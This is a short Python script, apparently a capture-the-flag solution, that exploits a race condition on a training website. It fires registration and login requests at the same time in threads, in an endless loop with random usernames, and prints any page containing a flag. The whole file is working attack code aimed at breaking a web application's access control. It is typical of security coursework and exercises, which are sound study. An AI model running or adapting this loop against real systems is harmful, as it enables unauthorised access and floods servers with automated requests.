import requests
import string
import random
from threading import Thread
import time
import sys

URL = "http://meta.training.jinblack.it/"

#we need to break get_challenges

def registration(session, username, password1, password2):
    payload = { "username": username, "password_1": password1, "password_2": password2, "reg_user": 1 }
    r = session.post(URL + "register.php", data=payload)
	
def login(session, username, password):
    payload = { "username": username, "password": password, "log_user": 1 }
    r = session.post(URL + "login.php", data=payload)
    if "Login Completed!" in r.text:
        print("Login Completed!")
        r = session.get(URL + "index.php")
        if "flag{" in r.text: 
            print(r.text)
	
#def randomString(N=10):
#	return ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))

small_letters = string.ascii_lowercase
big_letters = string.ascii_uppercase
nums = string.digits

def randomString():
    return ''.join(random.choice(small_letters+big_letters+nums) for i in range(10))


while True:
    u = randomString()
    p1 = u
    p2 = p1
    s = requests.Session()
	
    register_thread = Thread(target=registration, args=[s, u, p1, p2])
    login_thread = Thread(target=login, args=[s, u, p1])
    
    register_thread.start()
    login_thread.start()
    
    time.sleep(0.1)
    
# in case we need to craft out own cookie, then we can use the function cookiejar and then add the modified cookie
# from the cookiejar